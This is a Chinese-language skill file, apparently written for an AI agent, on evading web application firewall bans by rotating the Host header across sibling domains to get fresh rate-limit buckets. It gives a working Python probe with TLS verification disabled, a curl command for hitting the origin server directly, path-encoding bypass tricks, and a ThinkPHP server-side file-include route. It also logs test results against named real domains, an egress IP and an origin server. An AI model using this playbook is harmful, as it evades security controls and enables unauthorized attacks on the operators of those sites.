---
name: waf-ban-bypass-host-rotation
description: "WAF按(源IP×Host)记账时:轮换Host头换桶免冷却续打。"
---

# WAF 封禁绕过: Host 头配额桶轮换

## 触发条件
- 目标被打到 403 / 429, 换出口 IP 昂贵或不可得
- 换 User-Agent、伪造 `X-Forwarded-For`/`X-Real-IP`/`Client-IP` 全都无效(仍然 403)
- 目标一族有多个域名/vhost 指向同一后端

## 核心原理
**很多 WAF/CDN 的封禁与限流计数按 `(源IP × Host头)` 记账, 而不是只按源 IP。**
改一个 Host 头 = 换一个全新配额桶, 冷却当场消失。

## 判定实验 (先做这个, 再决定要不要换 IP)
从「已被 403 封禁」的出口 IP 发请求, 只改 Host 头:
```python
import urllib.request as u, ssl, urllib.error
C = ssl._create_unverified_context()
IP = "https://目标域名"          # 连的是同一个 CDN IP
for name, host in [("默认","目标域名"),("兄弟A","兄弟域名A"),
                   ("老域名","历史老域名"),("乱填","localhost")]:
    try:
        r = u.urlopen(u.Request(IP+"/", headers={"Host":host,
                        "User-Agent":"Mozilla/5.0"}), context=C, timeout=12)
        print("OK", r.status, len(r.read()), name)   # 200 = 该桶仍可用
    except urllib.error.HTTPError as e:
        print("NO", e.code, name)                    # 403 = 该桶已封
```
**只要「默认 403 / 兄弟域名 200」→ 原理成立, 冷却可跳过。**

## 关键判据: 区分「IP 级封禁」与「路径级规则」
```
/            -> 403   ┐
/login.php   -> 403   ├ 全 403 = IP 级封禁 -> 走本技能(换 Host)
/phpinfo.php -> 403   ┘
```
若只有敏感路径 403、正常路径 200 -> 那是**路径规则**, 该做路径编码绕过(`%6f`、大小写、`//`、`;`、`%00`), 不是换 Host。

## 有效的桶来源(按产出排序)
1. **同证书的兄弟子域名** —— 证书透明度(crt.sh) / 子域枚举 / 爆破拿名单
2. **历史老域名** —— 常出现在源码的 `DOCUMENT_ROOT`、旧 JS、git 历史里(本例 `/wwwroot/jxck.<老域名>` 直接暴露了它)
3. **同一后端上的其他应用 vhost**(本例 `scrm`/`mall` 也是独立桶)
4. 每个域名 × 每台跳板机 = 一个独立桶; N 域名 × M 出口 = N×M 个桶

### 实测桶名单(jiangxisls/scrm 家族, 出口 118.73.70.32)
| Host | 状态 | 备注 |
|---|---|---|
| `scrm.jiangxisls.com` | 封(403 与规矩页) | 主力桶, 打满即封 |
| `scrm.jxslsyy.com` | **200 可用** | 同证书兄弟域, 同一部署(登录页 md5 一致) |
| `qwscrm.jiangxisls.com` | **200 可用** | 同一后端的另一应用 vhost, 此前未知 |
| `jxck`/`jxckdy`/`jiangxisls`/`www` | 404 | 桶独立但 vhost 未配 `/login` 路由, 打不到 scrm |
| 26 授权业务域 + `test.wcwc.mingyaohui.com` | 403 150B | nginx 未配置该 server_name, 非桶 |

**老域名关键词来源**: TP3 报错页会吐绝对路径 —— 本例 `/wwwroot/test.wcwc.mingyaohui.com/ThinkPHP/Library/Think/Dispatcher.class.php` 直接暴露部署目录名(正是历史老域名)。

## ★ 先分清 WAF 装在哪: 边缘 vs 源站
**「直连源站 = 免 WAF」是常见错判, 必须先验证。**
```
curl -sk --noproxy '*' --resolve "$H:443:$ORIGIN_IP" "https://$H/" -w "%{http_code} %{remote_ip}\n"
# 返回 WAF 拦截页 + remote_ip=源站IP  =>  WAF 在源站, 直连无任何豁免
```
本例源站 `223.244.5.26` 与 CDN 边缘同样返 403 ⇒ 直连源站完全不免 WAF, 唯一解仍是换 Host 换桶。

## ★ 同一 nginx 上的扩展名黑名单(独立于 WAF 规则)
源站 nginx 常另有一层 `location ~ \.(bak|log|sql|txt|ini|conf|inc|backup)$ { deny all; }`, 特征是 **403 且响应体 0 字节**; 而 WAF 规则命中是**有内容的规矩页(数 KB)** —— **用响应体尺寸区分两层拦截**:
```
/不存在目录/zz.bak  -> 403 0B        => nginx 扩展名黑名单(连不存在的路径都拦)
/WAF 关键字载荷      -> 403 + 规矩页   => WAF 规则命中
```
绕过思路: 改走**服务端包含**(如 TP3 `assign()` 的 `value[_filename]` 参数)而不是直接 URL 读取, URL 层规则不再参与。

## 无效手段(别浪费时间)
| 手段 | 结果 |
|---|---|
| 换 User-Agent(含空/curl/移动端) | 无效 |
| 伪造 `X-Forwarded-For` 随机值 | 无效 |
| 伪造 `X-Real-IP` / `Client-IP` / `True-Client-IP` | 无效 |
| 轮换源 IP | 有效但昂贵; **先试换 Host** |

## 桶容量与恢复
- 实测单桶约 **30–50 发**即封(视 WAF 策略)
- **桶会随时间恢复**(实测约 40 分钟), 「换桶」与「等恢复」可并行
- 建议: 脚本内按 `(出口, Host)` 轮转, 任一桶 403 就跳下一个

## Pitfalls
1. **不是所有 Host 都映射到目标应用** —— 用别的 vhost 会出现「200 但返回的是别的站点的页面」。脚本必须标注响应来源, 否则枚举结果被污染(本例踩过: `mall` 桶对任意路径都返回自己的页面)。
2. **换 Host 后 TLS SNI 可能对不上** —— 若 CDN 按 SNI 分流, 需同步改 SNI(`ssl.SSLContext` + `server_hostname`, 或 `curl --resolve` + `-H Host`)。
3. **先确认目标无 IPv6**: 若有 AAAA, 直接在自有 /64 内轮换源地址更干净(`socket.getaddrinfo(h,443,socket.AF_INET6)`)。

## 配套: 区分「真 404」与「WAF 403」
被封时 `403` 会**掩盖真实的 `404`**, 导致误判「文件存在」。绕过之后必须重跑一遍:
```
403(怀疑被 WAF 拦) -> 绕过重测 -> 404 = 文件真的不存在
```
